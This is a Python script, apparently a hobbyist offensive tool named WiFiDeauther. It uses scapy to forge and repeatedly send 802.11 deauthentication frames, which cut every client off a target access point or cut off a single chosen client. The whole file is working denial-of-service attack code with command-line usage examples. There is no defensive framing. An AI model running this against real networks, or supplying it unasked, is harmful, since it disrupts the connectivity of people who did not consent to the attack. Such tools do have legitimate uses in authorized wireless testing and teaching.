#!/bin/usr/python3

# Author: Slax38

# New Version v0.6.3 --> Design improvement

# Version v0.6.2

from scapy.all import *
import os, time, re, subprocess, getopt
import random
import signal
import sys

DN = open(os.devnull, 'w')
options = "h:i:b:d:c:"
stop_capture = False


def menu():
   print()
   print("usage: python3 WiFiDeauther.py -help")
menu()



def deauthattack(interface, bssid, deauth_count):
   global stop_capture
   print()
   print("WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38")
   print()
   print("[+] Capturing beacon from", bssid)
   def sniff_callback(packet):
       global stop_capture
       if Dot11Beacon in packet and packet.addr2 == bssid:
           print("[+] ESSID: " + packet.info.decode())
           stop_capture = True
   time.sleep(0.2)
   sniff(iface=interface, prn=sniff_callback, stop_filter=lambda x: stop_capture)
   dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
   rsn = Dot11Deauth(reason=7)
   packet = RadioTap()/dot11/rsn
   for i in range(int(deauth_count)):
       sendp(packet, iface = interface, count=1, verbose=0)
       print(f"[+] Deauth packet sent to {bssid}")
       time.sleep(0.2)
   print("[i] Deauth attack finished.")


def signal_handler(signal, frame):
    print("[!] Exit")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def deauthclient(interface, bssid, client, deauth_count):
    global stop_capture
    print("WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38")
    print("[+] Capturing beacon from", bssid)
    dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
    rsn = Dot11Deauth(reason=7)
    packet = RadioTap()/dot11/rsn
    for i in range(int(deauth_count)):
        sendp(packet, iface = interface, count=1, verbose=0)
        print(f"[+] Deauth packet sent to {client} from {bssid}")
        time.sleep(0.2)
    print("[+] Deauth attack finished.")

def helpPanel():
    os.system("figlet WiFiDeauther")
    print("------------------------------------------------------------------")
    print("\tWiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38")
    print()
    print("Arguments:")
    print("-help, --helpPanel")
    print("-i, --interface=<wlan0>")
    print("-b, --bssid of the AP")
    print("-c, --the client's mac   *optional")
    print("-d, --deauths Ej: 100")
    print()
    print("Example: wifideauther -i wlan0 -b ec:f0:fe:ff:fc:03 -d 500")
    print(" or")
    print("wifideauther -i wlan0 -b ec:f0:fe:ff:fc:03 -c 7c:2a.db:78:3b:14 -d 500")
    print()
    sys.exit(0)


try:
  opts, args = getopt.getopt(sys.argv[1:], options)
except getopt.GetoptError:
  sys.exit(2)

interface = None
bssid = None
client = None
deauth_count = None

for opt, arg in opts:
  if opt == "-h":
      print()
      helpPanel()
  elif opt == "-i":
    interface = arg
  elif opt == "-b":
    bssid = arg
  elif opt == "-c":
    client = arg
  elif opt == "-d":
    deauth_count = arg

if interface and bssid and client and deauth_count is not None:
    deauthclient(interface, bssid, client, deauth_count)
elif interface and bssid and deauth_count is not None:
    deauthattack(interface, bssid, deauth_count)
